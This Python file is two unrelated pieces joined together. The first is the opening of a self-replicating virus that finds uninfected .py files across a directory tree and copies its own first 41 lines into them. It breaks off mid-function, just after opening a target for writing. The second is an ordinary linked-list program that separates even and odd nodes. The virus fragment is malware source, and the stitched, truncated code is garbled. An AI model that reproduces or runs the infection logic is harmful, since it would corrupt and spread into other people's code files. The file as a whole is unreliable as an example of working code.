#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to segregate even and odd nodes in a
# Linked List
head = None # head of list

# Node class
class Node:
	
	# Function to initialise the node object
	def __init__(self, data):
		self.data = data # Assign data
		self.next =None

# Function to segregate even and odd nodes.
def segregateEvenOdd():
	global head
	
	# Starting node of list having
	# even values.
	evenStart = None
	
	# Ending node of even values list.
	evenEnd = None
	
	# Starting node of odd values list.
	oddStart = None
	
	# Ending node of odd values list.
	oddEnd = None
	
	# Node to traverse the list.
	currNode = head
	
	while(currNode != None):
		val = currNode.data
		
		# If current value is even, add
		# it to even values list.
		if(val % 2 == 0):
			if(evenStart == None):
				evenStart = currNode
				evenEnd = evenStart
			else:
				evenEnd . next = currNode
				evenEnd = evenEnd . next
		
		# If current value is odd, add
		# it to odd values list.
		else:
			if(oddStart == None):
				oddStart = currNode
				oddEnd = oddStart
			else:
				oddEnd . next = currNode
				oddEnd = oddEnd . next
				
		# Move head pointer one step in
		# forward direction
		currNode = currNode . next
	
	# If either odd list or even list is empty,
	# no change is required as all elements
	# are either even or odd.
	if(oddStart == None or evenStart == None):
		return
	
	# Add odd list after even list.	
	evenEnd . next = oddStart
	oddEnd . next = None
	
	# Modify head pointer to
	# starting of even list.
	head = evenStart

''' UTILITY FUNCTIONS '''
''' Function to insert a node at the beginning '''
def push(new_data):
	
	global head
	# 1 & 2: Allocate the Node &
	#		 Put in the data
	new_node = Node(new_data)
	
	# 3. Make next of new Node as head
	new_node.next = head
	
	# 4. Move the head to point to new Node
	head = new_node

''' Function to print nodes in a given linked list '''
def printList():
	global head
	node = head
	while (node != None):
		print(node.data, end = " ")
		node = node.next
	print()
	
''' Driver program to test above functions'''

''' Let us create a sample linked list as following
0.1.4.6.9.10.11 '''

push(11)
push(10)
push(9)
push(6)
push(4)
push(1)
push(0)

print("Original Linked list")
printList()

segregateEvenOdd()

print("Modified Linked list")
printList()

# This code is contributed by shubhamsingh10.
# Time Complexity: O(n) as we are only traversing linearly through the list
# Space Complexity: O(1)
